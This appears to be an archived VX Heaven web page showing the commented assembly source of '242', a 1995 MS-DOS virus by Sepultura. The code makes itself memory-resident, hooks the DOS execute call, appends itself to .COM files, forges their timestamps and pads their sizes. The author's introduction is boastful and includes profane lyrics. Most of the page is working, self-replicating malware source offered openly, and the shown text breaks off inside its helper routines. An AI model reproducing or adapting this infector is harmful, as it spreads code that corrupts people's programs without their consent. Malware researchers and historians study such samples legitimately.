<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>242 - Virus for MS-DOS written by Sepultura (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"751a2c2be630a27cc7bd055ea28d170559017639-1498759720-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Biblioteca</a> <a href="/vl.php">Collezione</a> <a href="/src.php">Sorgenti</a> <a href="/vx.php?id=eidx">Polymorphic Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulatori</a> <a href="/vx.php?id=uidx">Utilità</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Dona</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/src_view.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option selected="selected" value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Cerca"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>Codice sorgente di virus</h1><h2>242</h2><p><em>Virus for MS-DOS</em></p><p><strong>Sepultura</strong><br/><small><a href="/src.php?author=Sepultura">Mostra tutti i virus di questo autore</a></small></p><small><a href="/src.php?info=242.zip">Descrizione e download</a></small><br/><p>1995-00-00</p><h2>242.ASM</h2> [<a href="/src_view.php?file=242.zip&amp;view=242.ASM&amp;highlight=off">Disattiva la sottolineatura</a>] <hr/><pre class="asm" style="font-family:monospace;color: #000066; background-color: #cccbbb;">comment ~
&nbsp;
<span style="color: black;">&#91;</span><span style="color: #ff0000;">242</span><span style="color: black;">&#93;</span> <span style="color: #339933;">-</span> by Sepultura <span style="color: #ff0000;">1995</span><span style="color: black;">&#40;</span>c<span style="color: black;">&#41;</span>
&nbsp;
Well<span style="color: #339933;">..</span> This is my Front<span style="color: #339933;">-</span><span style="color: #ff0000;">242</span> Tribute virus<span style="color: #339933;">...</span>
&nbsp;
I figured those crazy Belgians deserve it<span style="color: #339933;">..</span> besides keeping me awake while I
was coding Chaos<span style="color: #339933;">-</span>AD <span style="color: #00007f; font-weight: bold;">and</span> TCE<span style="color: #339933;">,</span> they have also been a source of inspiration to
many other coders<span style="color: #339933;">.</span> The best example is the Amiga demo <span style="color: #7f007f;">'242'</span> <span style="color: black;">&#40;</span>I love it |<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> by
Fairlight<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">or</span> perhaps all the quotes from <span style="color: #ff0000;">242</span> songs <span style="color: #00007f; font-weight: bold;">and</span> CD covers <span style="color: #00007f; font-weight: bold;">in</span> all of
Neurobashers viruses<span style="color: #339933;">..</span> <span style="color: black;">&#40;</span>BTW<span style="color: #339933;">:</span> Neurobashing is a <span style="color: #ff0000;">242</span> song<span style="color: black;">&#41;</span><span style="color: #339933;">.</span>
&nbsp;
It ain<span style="color: #7f007f;">'t to great, but you cant fit that much in 242 bytes. Speaking of size,
alot of the code may look unoptimized, but that is because I wanted to use
the value 242 as much as possible.. Anyway, here are some stats:
&nbsp;
Length: 242 bytes.
Memory Resident Address: 0:242h.
Yohoho Value: AX=242h.
New Date Stamp: 00-02-42.
New Time Stamp: 02:42:00 (Like on the cover of all their CDs).
Size Padding: Files are padded so that the length (Decimal) ends in 242.
The String '</span><span style="color: #ff0000;">242</span><span style="color: #7f007f;">' occurs in this source: 58 times |].
&nbsp;
Here'</span>s a sample DIR listing of infected files<span style="color: #339933;">:</span>
<span style="color: #339933;">----------------------------------------------</span>
 FORMAT   COM        <span style="color: #ff0000;">23</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 EDIT     COM         <span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 SYS      COM        <span style="color: #ff0000;">10</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 DOSKEY   COM         <span style="color: #ff0000;">6</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 CHOICE   COM         <span style="color: #ff0000;">2</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 DISKCOMP COM        <span style="color: #ff0000;">11</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 DISKCOPY COM        <span style="color: #ff0000;">14</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 HELP     COM         <span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 LOADFIX  COM         <span style="color: #ff0000;">2</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 MODE     COM        <span style="color: #ff0000;">24</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 MORE     COM         <span style="color: #ff0000;">3</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 TREE     COM         <span style="color: #ff0000;">7</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 UNFORMAT COM        <span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 VSAFE    COM        <span style="color: #ff0000;">63</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
 COMMAND  COM        <span style="color: #ff0000;">55</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span> <span style="color: #ff0000;">00</span><span style="color: #339933;">-</span><span style="color: #ff0000;">02</span><span style="color: #339933;">-</span><span style="color: #ff0000;">42</span>   <span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>42a
<span style="color: #339933;">----------------------------------------------</span>
&nbsp;
As for the virus<span style="color: #339933;">,</span> it is a memory resident <span style="color: #339933;">.</span>COM infector<span style="color: #339933;">,</span> infecting on <span style="color: #46aa03; font-weight: bold;">AH</span>=4B<span style="color: #339933;">.</span>
There is no <span style="color: #00007f; font-weight: bold;">INT</span> <span style="color: #ff0000;">24</span> handler<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">or</span> clearing of attributes<span style="color: #339933;">,</span> due to size <span style="color: #00007f; font-weight: bold;">and</span> stuph<span style="color: #339933;">.</span>
The first instruction of infect files is<span style="color: #339933;">:</span>
&nbsp;
<span style="color: #00007f; font-weight: bold;">TEST</span> <span style="color: #46aa03; font-weight: bold;">AL</span><span style="color: #339933;">,</span>FFh
&nbsp;
That is <span style="color: #ff0000;">0A8h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FFh</span><span style="color: #339933;">.</span> The sum of these two bytes is the same as the sum of <span style="color: #7f007f;">'M'</span>
<span style="color: #00007f; font-weight: bold;">and</span> <span style="color: #7f007f;">'Z'</span><span style="color: #339933;">,</span> so that the virus thinks it is an EXE file<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">and</span> wont infect it<span style="color: #339933;">..</span>
&nbsp;
As a final note<span style="color: #339933;">,</span> since I back<span style="color: #339933;">-</span>stabbed Sepultura <span style="color: black;">&#40;</span>the band |<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: #00007f; font-weight: bold;">in</span> Chaos<span style="color: #339933;">-</span>AD<span style="color: #339933;">,</span>
by slipping <span style="color: #00007f; font-weight: bold;">in</span> <span style="color: #7f007f;">'Progress, Protest, Process, No Rest'</span> from the Front <span style="color: #ff0000;">242</span> song
<span style="color: #7f007f;">'Motion'</span><span style="color: #339933;">,</span> I figured I better back<span style="color: #339933;">-</span>stab Front <span style="color: #ff0000;">242</span> too |<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> so here are some
profanities from the Tricky song <span style="color: #7f007f;">'Abbaon Fat Tracks'</span> as closing words<span style="color: #339933;">:</span>
&nbsp;
Fuck you <span style="color: #00007f; font-weight: bold;">in</span><span style="color: #339933;">,</span>
Tuck you <span style="color: #00007f; font-weight: bold;">in</span><span style="color: #339933;">,</span>
Suck you <span style="color: #00007f; font-weight: bold;">in</span><span style="color: #339933;">,</span>
I am she<span style="color: #339933;">,</span>
Fists are clutching<span style="color: #339933;">,</span>
Breast stroke<span style="color: #339933;">,</span>
Lots of Touching<span style="color: #339933;">,</span>
        <span style="color: #339933;">...</span>
I fuck you <span style="color: #00007f; font-weight: bold;">in</span> the ass<span style="color: #339933;">,</span>
Just for A laugh<span style="color: #339933;">,</span>
With the quick speed<span style="color: #339933;">,</span>
I<span style="color: #7f007f;">'ll make your nose bleed.
                        - Tricky.
~
&nbsp;
        radix   16
&nbsp;
ofs             =       offset
d_242           =       0f2             ;242 decimal..
&nbsp;
        org     0
&nbsp;
&nbsp;
start:  mov     cx,9                    ;For some reason, having to do with
blah:   push    0                       ;AX=242/i21, all the regs have to
        loop    blah                    ;be 0.. My HD crashed, and I lost my
        popa                            ;interrupt listing, so I couldn'</span>t
                                        <span style="color: black; font-style: italic;">;do a proper fix..</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span>                  <span style="color: black; font-style: italic;">;Yohoho call..</span>
        <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21</span>
        <span style="color: #00007f; font-weight: bold;">call</span>    delta                   <span style="color: black; font-style: italic;">;Same ol' shit..</span>
delta<span style="color: #339933;">:</span>  <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">si</span>
        <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>ofs delta
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span>                  <span style="color: black; font-style: italic;">;DI=242, (i.e. 0:242)        </span>
        <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span>                      <span style="color: black; font-style: italic;">;ES=0.</span>
        <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span>                  <span style="color: black; font-style: italic;">;'242' resident?</span>
        <span style="color: #00007f; font-weight: bold;">je</span>      restore                 <span style="color: black; font-style: italic;">;if so, restore the host..</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>d_242
        <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">si</span>
        <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
        <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">si</span>                      <span style="color: black; font-style: italic;">;Copy it,</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3521</span>
        <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21</span>                      <span style="color: black; font-style: italic;">;All the +242s, and [242]s are cos</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     int_21_seg<span style="color: black;">&#91;</span><span style="color: #ff0000;">242</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span>      <span style="color: black; font-style: italic;">;the virus is now at offset 242..</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     int_21_off<span style="color: black;">&#91;</span><span style="color: #ff0000;">242</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>ofs int_21_handler<span style="color: #339933;">+</span><span style="color: #ff0000;">242</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">25</span>                   <span style="color: black; font-style: italic;">;Set INT 21 (I orignally was going to</span>
        <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21</span>                      <span style="color: black; font-style: italic;">;exclude this, as it greatly lessened</span>
                                        <span style="color: black; font-style: italic;">;the chances of a crash, but I also</span>
                                        <span style="color: black; font-style: italic;">;noticed that it stopped '242' from</span>
                                        <span style="color: black; font-style: italic;">;spreading :P</span>
&nbsp;
restore<span style="color: #339933;">:</span><span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>ofs orig_5           <span style="color: black; font-style: italic;">;Restore the Host file,</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">100</span>
        <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">di</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span>
        <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
        <span style="color: #00007f; font-weight: bold;">ret</span>                             <span style="color: black; font-style: italic;">;return to cs:100h</span>
&nbsp;
        <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'[242]'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'Sepultura'</span>   <span style="color: black; font-style: italic;">;This is called a Text String</span>
&nbsp;
int_21_handler<span style="color: #339933;">:</span>                         <span style="color: black; font-style: italic;">;The INT 21 handler..</span>
        <span style="color: #00007f; font-weight: bold;">pushf</span>
        <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span>                  <span style="color: black; font-style: italic;">;is it the YoHoHo?</span>
        <span style="color: #00007f; font-weight: bold;">jne</span>     noyohoho                <span style="color: black; font-style: italic;">;if not, skip to the next thang..</span>
        <span style="color: #00007f; font-weight: bold;">popf</span>
        <span style="color: #00007f; font-weight: bold;">iret</span>
&nbsp;
noyohoho<span style="color: #339933;">:</span>
        <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span>4b                   <span style="color: black; font-style: italic;">;Execute?</span>
        <span style="color: #00007f; font-weight: bold;">jne</span>     no_infection            <span style="color: black; font-style: italic;">;if not, dont infect..</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">pusha</span>
        <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ds</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>3d02                 <span style="color: black; font-style: italic;">;open it</span>
        <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21</span>
        <span style="color: #00007f; font-weight: bold;">jc</span>      open_error              <span style="color: black; font-style: italic;">;error?</span>
        <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>ofs orig_5<span style="color: #339933;">+</span><span style="color: #ff0000;">242</span>       <span style="color: black; font-style: italic;">;save original 5 bytes..</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3f</span>
        <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>W<span style="color: black;">&#91;</span>orig_5<span style="color: black;">&#93;</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">242</span><span style="color: black;">&#93;</span>
        <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span>
        <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'Z'</span><span style="color: #339933;">+</span><span style="color: #7f007f;">'M'</span>              <span style="color: black; font-style: italic;">;is it an EXE or infected file?</span>
        <span style="color: #00007f; font-weight: bold;">je</span>      infected                <span style="color: black; font-style: italic;">;of so exit..</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">call</span>    _se                     <span style="color: black; font-style: italic;">;Seek to end of file..</span>
        <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>0feff <span style="color: #339933;">-</span> d_242 <span style="color: #339933;">-</span> <span style="color: #ff0000;">999</span>  <span style="color: black; font-style: italic;">;File tpo big??</span>
        <span style="color: #00007f; font-weight: bold;">ja</span>      infected
        <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span>
        <span style="color: #00007f; font-weight: bold;">jbe</span>     infected                <span style="color: black; font-style: italic;">;too small perhaps?</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     jmp_buf<span style="color: black;">&#91;</span><span style="color: #ff0000;">242</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>d_242
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">242</span>
        <span style="color: #00007f; font-weight: bold;">call</span>    _wf                     <span style="color: black; font-style: italic;">;Write the virus..</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>
        <span style="color: #00007f; font-weight: bold;">call</span>    _ss                     <span style="color: black; font-style: italic;">;back to the start..</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>ofs new_5<span style="color: #339933;">+</span><span style="color: #ff0000;">242</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span>
        <span style="color: #00007f; font-weight: bold;">call</span>    _wf                     <span style="color: black; font-style: italic;">;write the marker, and the JMP..</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">call</span>    _se                     <span style="color: black; font-style: italic;">;Down to the bottom, we go..</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3e8</span>                  <span style="color: black; font-style: italic;">;Get modulous of length divided by</span>
        <span style="color: #00007f; font-weight: bold;">div</span>     <span style="color: #46aa03; font-weight: bold;">cx</span>                      <span style="color: black; font-style: italic;">;1000..</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>d_242                <span style="color: black; font-style: italic;">;Get number of bytes needed to pad</span>
        <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span>                   <span style="color: black; font-style: italic;">;it to XX,242 bytes..</span>
        if b    <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3e8</span>              <span style="color: black; font-style: italic;">;carry it up, if needed..</span>
        <span style="color: #00007f; font-weight: bold;">call</span>    _wf                     <span style="color: black; font-style: italic;">;write the padding..</span>
&nbsp;
infected<span style="color: #339933;">:</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5701</span>                 <span style="color: black; font-style: italic;">;Set Time and Date..</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>0001010101000000xB   <span style="color: black; font-style: italic;">;Time = 02:42:00</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>0111110000000010xB   <span style="color: black; font-style: italic;">;Date = 00-02-42</span>
        <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21</span>
        <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span>3e                   <span style="color: black; font-style: italic;">;close the file,</span>
        <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21</span>
&nbsp;
open_error<span style="color: #339933;">:</span>                             <span style="color: black; font-style: italic;">;and exit..</span>
        <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ds</span>
        <span style="color: #00007f; font-weight: bold;">popa</span>
&nbsp;
no_infection<span style="color: #339933;">:</span>                           <span style="color: black; font-style: italic;">;leave INT 21 handler..</span>
        <span style="color: #00007f; font-weight: bold;">popf</span>
&nbsp;
        <span style="color: #00007f; font-weight: bold;">jmp</span>     <span style="color: #ff0000;">1234</span><span style="color: #339933;">:</span><span style="color: #ff0000;">5678</span>
int_21_off      =       W<span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span>
int_21_seg      =       W<span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span>
&nbsp;
_se<span style="color: #339933;">:</span>    <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>                    <span style="color: black; font-style: italic;">;Seek to End..</span>
_ss<span style="color: #339933;">:</span>    <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">42</span>                   <span style="color: black; font-style: italic;">;or beginnig perhaps?</span>
        <span style="color: #00007f; font-weight: bold;">cwd</span>
